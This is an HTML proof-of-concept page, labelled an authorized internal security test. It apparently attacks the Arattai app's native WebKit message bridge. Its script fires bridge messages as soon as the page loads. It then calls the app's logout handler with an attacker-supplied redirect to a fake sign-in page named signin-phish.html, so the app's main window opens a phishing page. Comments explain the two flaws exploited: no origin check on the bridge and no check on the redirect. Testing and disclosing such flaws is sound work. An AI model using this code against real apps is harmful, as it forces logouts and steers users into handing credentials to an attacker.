<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Arattai native-bridge PoC (authorized security test)</title>
</head>
<body style="font-family:-apple-system,sans-serif;max-width:640px;margin:60px auto;text-align:center">
  <h2>Security test in progress</h2>
  <p id="status">Contacting native bridge...</p>
  <p style="color:#b00;font-weight:bold">SECURITY TEST ARTIFACT — authorized internal PoC only.<br>Do not enter real credentials on any page reached from here.</p>

<script>
// Finding 1 proof: this fires the instant the iframe loads, from whatever frame/origin
// this page is embedded in - no click beyond the one that mounted the iframe, no bridge
// origin check exists to stop it.
function fire(channel, arg) {
  try {
    window.webkit.messageHandlers.arattai.postMessage({ c: channel, a: arg });
    return true;
  } catch (e) {
    document.getElementById("status").innerText = "bridge not reachable from this context: " + e;
    return false;
  }
}

if (fire("__trace__", { stage: "NETWORK-POC-FINDING-1", detail: "fired from " + location.href })) {
  // Finding 2 proof: do-logout is reachable from this same unauthenticated context and
  // takes an attacker-supplied redirect with no NavigationPolicy.allowsInAppNavigation check.
  fire("do-logout", {
    logout_url: location.origin + "/signin-phish.html",
    re_login_url: ""
  });
  document.getElementById("status").innerText =
    "Finding 1 + Finding 2 PoC fired. The app's main window should now navigate to signin-phish.html.";
}
</script>
</body>
</html>
